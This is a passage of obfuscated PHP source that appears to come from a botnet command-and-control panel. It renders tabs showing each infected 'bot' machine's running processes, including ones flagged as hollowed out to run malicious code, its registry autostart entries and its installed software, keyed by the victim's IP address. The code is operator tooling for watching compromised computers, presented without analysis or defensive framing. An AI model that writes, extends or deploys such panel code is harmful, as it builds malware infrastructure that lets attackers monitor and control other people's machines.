                        $process_path = str_replace(" (IRE+)", " &nbsp;&nbsp;<strong>(Real, primary explorer instance)</strong>", $process_path);
                    }
                    if (1 < strlen($process_path)) {
                        echo "\t\t<tr>\r\n";
                        echo "\t\t\t<td><strong>" . $iDisplayCount . "</strong></td>\r\n";
                        echo "\t\t\t<td><i>" . htmlspecialchars(trim($process_id, ": ")) . "</i></td>\r\n";
                        echo "\t\t\t<td>" . $x64_string . "</td>\r\n";
                        echo "\t\t\t<td>" . $zombie_string . "</td>\r\n";
                        echo "\t\t\t<td>" . $system_process_string . "</td>\r\n";
                        echo "\t\t\t<td>" . trim($process_path, "\r\n: ") . "</td>\r\n";
                        echo "\t\t</tr>\r\n";
                        $iDisplayCount++;
                    }
                }
                echo "\t</tbody>\r\n</table>\r\n<i>** &nbsp;This list does not contain all running processes. Common system processes, such as svchost.exe, csrss.exe, conhost.exe, this bot process and others are excluded to save bandwidth / space</i><br /><i>** &nbsp;'Zombie' column describes whether or not the process is a zombified process (Trusted process hollowed out to run malicious code)</i><br /><i>** &nbsp;'System' column describes whether or not the process is a system and/or service process</i><br />";
            }
        }
        echo "\t\t\t\t</div>\r\n\t\t\t\t<div id=\"pane4\" class=\"tab-pane ";
        echo $active_pane == 4 ? "active" : "";
        echo "\">\r\n\t\t\t\t\t<!-- Autostart list -->\r\n\t\t\t\t\t\r\n\t\t\t\t\t";
        $iDisplayCount = 0;
        $iSaveCount = 0;
        $szTailMsg = "";
        $current_key = "";
        $autostart_list = $bot_record_info["InfoAutostartList"];
        $autostart_array = NULL;
        $as_list = NULL;
        $bIsOK = true;
        $bIsBad = false;
        $szTabHeaderString = "Autostart list for <i>" . $bot_ip_string . "</i>";
        $iLastUpdated = 0;
        if (strlen($autostart_list) < 12) {
            $bIsOK = false;
        } else {
            if (!($autostart_array = explode("\n", $autostart_list))) {
                $bIsOK = false;
            }
        }
        if (strstr(strtolower($autostart_list), "<script") || strstr(strtolower($autostart_list), "<img")) {
            $bIsOK = false;
            $bIsBad = true;
        }
        if (_obfuscated_0D02260502393F0B3E2C39323606290A2426311C073522_($autostart_list, $iLastUpdated) == true) {
            $szTabHeaderString .= "&nbsp;&nbsp;<i>(Last updated: " . date("m/d/Y h:i:s a", $iLastUpdated) . ")</i>";
        }
        echo "<font size=\"2\" face=\"Tahoma\">\r\n";
        echo "\t<strong>" . $szTabHeaderString . "</strong>";
        echo "</font>\r\n<br /><br />\r\n";
        if ($bIsOK == false && $bIsBad == true) {
            echo "<font color=\"#E80000\">HTML/script tag detected inside autostart list data! Possible attempt to alter page. Listing halted.</font>";
        } else {
            if ($bIsOK == false) {
                echo "No autostart list data has been collected yet";
            } else {
                for ($i = 0; $i < count($autostart_array); $i++) {
                    if (substr($autostart_array[$i], 0, 7) == "//HKLM\\" || substr($autostart_array[$i], 0, 7) == "//HKCU\\") {
                        $current_key = substr($autostart_array[$i], 2);
                    } else {
                        if (stripos($autostart_array[$i], "HKCU\\..\\Windows, ") !== false && stripos($autostart_array[$i], "=") !== false) {
                            $iPathPos = stripos($autostart_array[$i], "=\"");
                            $szPath = "";
                            if ($iPathPos !== false && 18 < $iPathPos) {
                                $szPath = substr($autostart_array[$i], $iPathPos + 2);
                                $szPath = substr($szPath, 0, strlen($szPath) - 1);
                                if (3 < strlen($szPath)) {
                                    $as_list[$iSaveCount]["is_valid"] = true;
                                    $as_list[$iSaveCount]["key"] = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
                                    $as_list[$iSaveCount]["name"] = strstr($autostart_array[$i], ", Run=\"") ? "Run" : "Load";
                                    $as_list[$iSaveCount]["path"] = $szPath;
                                    $iSaveCount++;
                                }
                            }
                        } else {
                            if (1 <= substr_count($autostart_array[$i], "::")) {
                                $iColPos = strpos($autostart_array[$i], "::");
                                if ($iColPos !== false) {
                                    $as_name = substr($autostart_array[$i], 0, $iColPos);
                                    $as_path = substr($autostart_array[$i], $iColPos + 2);
                                }
                            } else {
                                $as_name = "N/A";
                                $as_path = $autostart_array[$i];
                            }
                            if (256 < strlen($as_name)) {
                                $as_name = substr($as_name, 0, 256);
                            }
                            if (340 < strlen($as_path)) {
                                $as_path = substr($as_path, 0, 340);
                            }
                            $as_list[$iSaveCount]["is_valid"] = true;
                            $as_list[$iSaveCount]["key"] = $current_key;
                            $as_list[$iSaveCount]["name"] = $as_name;
                            $as_list[$iSaveCount]["path"] = $as_path;
                            $iSaveCount++;
                        }
                    }
                }
                if (0 < $iSaveCount) {
                    echo "<table class=\"table table-bordered table-condensed table-striped\" align=\"left\" valign=\"top\" style=\"width: 1100px;\">\r\n\t<thead>\r\n\t\t<tr>\r\n\t\t\t<th width=\"5%\">#</th>\r\n\t\t\t<th width=\"17%\">Key</th>\r\n\t\t\t<th width=\"23%\">Entry Name</th>\r\n\t\t\t<th width=\"55%\">Path</th>\r\n\t\t</tr>\r\n\t</thead>\r\n\t<tbody>\r\n";
                    for ($i = 0; $i < count($autostart_array); $i++) {
                        $as_name = "";
                        $as_path = "";
                        if (isset($as_list[$i]["is_valid"]) && $as_list[$i]["is_valid"] == true && isset($as_list[$i]["name"]) && isset($as_list[$i]["path"]) && 3 < strlen($as_list[$i]["path"])) {
                            $short_key_path = "";
                            $short_name = htmlspecialchars($as_list[$i]["name"]);
                            $short_path = htmlspecialchars($as_list[$i]["path"]);
                            if (54 < strlen($short_name)) {
                                $short_name = substr($short_name, 0, 50) . " <strong>...</strong>";
                            }
                            if (strstr($as_list[$i]["key"], "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run") && strstr($as_list[$i]["key"], "(x86)")) {
                                $short_key_path = "HKLM\\...\\Wow6432Node\\...\\Run";
                            } else {
                                if (strstr($as_list[$i]["key"], "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
                                    $short_key_path = "HKLM\\...\\CurrentVersion\\Run";
                                } else {
                                    if (strstr($as_list[$i]["key"], "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
                                        $short_key_path = "HKCU\\...\\CurrentVersion\\Run";
                                    } else {
                                        if (strstr($as_list[$i]["key"], "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")) {
                                            $short_key_path = "HKLM\\...\\CurrentVersion\\Run";
                                        } else {
                                            if (strstr($as_list[$i]["key"], "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")) {
                                                $short_key_path = "HKCU\\...\\CurrentVersion\\RunOnce";
                                            } else {
                                                if (strstr($as_list[$i]["key"], "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run")) {
                                                    $short_key_path = "HKLM\\...\\Explorer\\Run";
                                                } else {
                                                    if (strstr($as_list[$i]["key"], "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows")) {
                                                        $short_key_path = "HKCU\\...\\Windows NT\\...\\Windows";
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            echo "\t\t<tr>\r\n";
                            echo "\t\t\t<td width=\"2%\"><strong>" . $iDisplayCount++ . "</strong></td>\r\n";
                            echo "\t\t\t<td width=\"16%\">" . $short_key_path . "</td>\r\n";
                            echo "\t\t\t<td width=\"24%\"><i>" . $short_name . "</i></td>\r\n";
                            echo "\t\t\t<td width=\"58%\">" . $short_path . "</td>\r\n";
                            echo "\t\t</tr>\r\n";
                        }
                    }
                    echo "\t</tbody>\r\n</table>\r\n";
                } else {
                    echo "No autostart list data has been collected yet";
                }
            }
        }
        echo "\t\t\t\t</div>\r\n\t\t\t\t\r\n\t\t\t\t<div id=\"pane5\" class=\"tab-pane ";
        echo $active_pane == 5 ? "active" : "";
        echo "\">\r\n\t\t\t\t\t<!-- Installed software list -->\r\n\t\t\t\t\t\r\n\t\t\t\t\t";
        $iDisplayCount = 0;
        $iSaveCount = 0;
        $szTailMsg = "";
        $current_key = "";
        $software_list = $bot_record_info["InfoSoftwareList"];
        $software_array = NULL;
        $as_list = NULL;
        $bIsOK = true;
        $bIsBad = false;
        $szTabHeaderString = "Installed software list for <i>" . $bot_ip_string . "</i>";
        $iLastUpdated = 0;
        if (strlen($software_list) < 12) {
            $bIsOK = false;
        } else {
            if (!($software_array = explode("\n", $software_list))) {
                $bIsOK = false;
            }
        }
        if (strstr(strtolower($software_list), "<script") || strstr(strtolower($software_list), "<img")) {
            $bIsOK = false;
            $bIsBad = true;
        }
        if (_obfuscated_0D02260502393F0B3E2C39323606290A2426311C073522_($software_list, $iLastUpdated) == true) {
            $szTabHeaderString .= "&nbsp;&nbsp;<i>(Last updated: " . date("m/d/Y h:i:s a", $iLastUpdated) . ")</i>";
        }
        echo "<font size=\"2\" face=\"Tahoma\">\r\n";
        echo "\t<strong>" . $szTabHeaderString . "</strong>";
        echo "</font>\r\n<br /><br />\r\n";
        if ($bIsOK == false && $bIsBad == true) {
            echo "<font color=\"#E80000\">HTML/script tag detected inside installed software list data! Possible attempt to alter page. Listing halted.</font>";
        } else {
            if ($bIsOK == false) {
                echo "No installed software list data has been collected yet";
            } else {
                $iSaveCount = count($software_array);
                if (0 < $iSaveCount) {
                    echo "<table class=\"table table-bordered table-condensed table-striped\" align=\"left\" valign=\"top\" style=\"width: 1100px;\">\r\n\t<thead>\r\n\t\t<tr>\r\n\t\t\t<th width=\"6%\">#</th>\r\n\t\t\t<th width=\"34%\">Display Name</th>\r\n\t\t\t<th width=\"60%\">Path</th>\r\n\t\t</tr>\r\n\t</thead>\r\n\t<tbody>\r\n";
                    for ($i = 0; $i < count($software_array); $i++) {
                        if (isset($software_array[$i]) && 2 < strlen($software_array[$i])) {
                            $entry_parts = explode("::", $software_array[$i]);
                            if (isset($entry_parts[0]) && isset($entry_parts[1])) {
                                $short_key_path = "";
                                $short_name = htmlspecialchars($entry_parts[0]);
                                $short_path = htmlspecialchars($entry_parts[1]);
                                if (69 < strlen($short_name)) {
                                    $short_name = substr($short_name, 0, 50) . " <strong>...</strong>";
                                }
                                if (199 < strlen($short_path)) {
                                    $short_path = substr($short_path, 0, 50) . " <strong>...</strong>";
                                }
                                echo "\t\t<tr>\r\n";
                                echo "\t\t\t<td width=\"6%\"><strong>" . $iDisplayCount++ . "</strong></td>\r\n";
                                echo "\t\t\t<td width=\"34%\"><i>" . $short_name . "</i></td>\r\n";
                                echo "\t\t\t<td width=\"60%\">" . $short_path . "</td>\r\n";
                                echo "\t\t</tr>\r\n";
                            }
                        }
                    }
                    echo "\t</tbody>\r\n</table>\r\n";
                } else {
                    echo "No installed software list data has been collected yet";
                }
            }
        }
        echo "\t\t\t\t\t\r\n\t\t\t\t</div>\r\n\t\t\t\t<div id=\"pane6\" class=\"tab-pane ";
        echo $active_pane == 6 ? "active" : "";
        echo "\">\r\n\t\t\t\t\t<!-- Generic information -->\r\n\t\t\t\t\t\r\n\t\t\t\t\t<i>Not implemented yet</i>\r\n\t\t\t\t\t\r\n\t\t\t\t</div>\r\n\r\n\t\t\t\t<div id=\"pane7\" class=\"tab-pane ";
        echo $active_pane == 7 ? "active" : "";
        echo "\">\r\n\t\t\t\t\t<!-- Debug information -->\r\n\t\t\t\t</div>\r\n\t\t\t  </div><!-- /.tab-content -->\r\n\t\t\t</div><!-- /.tabbable -->\r\n\t\t</td>\r\n\t</tr>\r\n</table>\r\n</font>\r\n\r\n";
    } else {
        echo " &nbsp;No bots found with ID <i>" . $id . "</i>";
    }
}
echo "\r\n\r\n";
function _obfuscated_0D02260502393F0B3E2C39323606290A2426311C073522_($blob_data, &$LastUpdatedTime)
{
    $_obfuscated_0D18313835321F1524210722370A030325220E0D3D3811_ = false;
    if (strstr($blob_data, "<meta>\n") && strstr($blob_data, "</meta>\n\n")) {
        $_obfuscated_0D080B2B34122B37181906163E35272F2D2C5C2F0E0211_ = stripos($blob_data, "<meta>\n");
        $_obfuscated_0D1B24183902180C3E0A3C1A3D0716135B3323273F3132_ = stripos($blob_data, "</meta>\n\n");
        $_obfuscated_0D142724235C112238341B1725042B372238042C010E01_ = 0;
        $_obfuscated_0D050F2D1A5C341D013C0912272D2A240327272A292911_ = 0;
        if ($_obfuscated_0D080B2B34122B37181906163E35272F2D2C5C2F0E0211_ !== false && $_obfuscated_0D1B24183902180C3E0A3C1A3D0716135B3323273F3132_ !== false) {
            $_obfuscated_0D142724235C112238341B1725042B372238042C010E01_ = stripos($blob_data, "<lu>", $_obfuscated_0D080B2B34122B37181906163E35272F2D2C5C2F0E0211_);
            if ($_obfuscated_0D142724235C112238341B1725042B372238042C010E01_ !== false) {
                $_obfuscated_0D050F2D1A5C341D013C0912272D2A240327272A292911_ = stripos($blob_data, "</lu>", $_obfuscated_0D142724235C112238341B1725042B372238042C010E01_);
                if ($_obfuscated_0D050F2D1A5C341D013C0912272D2A240327272A292911_ !== false) {
                    $LastUpdatedTime = (int) substr($blob_data, (int) $_obfuscated_0D142724235C112238341B1725042B372238042C010E01_ + 4, $_obfuscated_0D050F2D1A5C341D013C0912272D2A240327272A292911_);
                    $_obfuscated_0D18313835321F1524210722370A030325220E0D3D3811_ = true;
                }
            }
        }
    }
    return $_obfuscated_0D18313835321F1524210722370A030325220E0D3D3811_;
}
function _obfuscated_0D351907351203383E0311143B1F363C0D183F09383D22_($time_begin = 0, $time_end = 0)
{
    if ($time_begin == 0 || $time_end == 0) {
        return "N/A";
    }
    $_obfuscated_0D272B4019081B120622081C2C5C3F0D06060D323B3111_ = new DateTime();
    $_obfuscated_0D2532053E35383C1E063E02292E191432112635111B11_ = new DateTime();
    $_obfuscated_0D272B4019081B120622081C2C5C3F0D06060D323B3111_->setTimestamp($time_begin);
    $_obfuscated_0D2532053E35383C1E063E02292E191432112635111B11_->setTimestamp($time_end);
    $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ = "";
    $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_ = date_diff($_obfuscated_0D272B4019081B120622081C2C5C3F0D06060D323B3111_, $_obfuscated_0D2532053E35383C1E063E02292E191432112635111B11_);
    if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_) {
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->m) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->m . "(M) ";
        }
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->d) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->d . "d ";
        }
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->h) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->h . "h ";
        }
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->i) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->i . "m ";
        }
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->s) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->s . "s ";
        }
    }
    if (strlen($_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_) < 2) {
        $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ = "N/A";
    }
    return $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_;
}

?>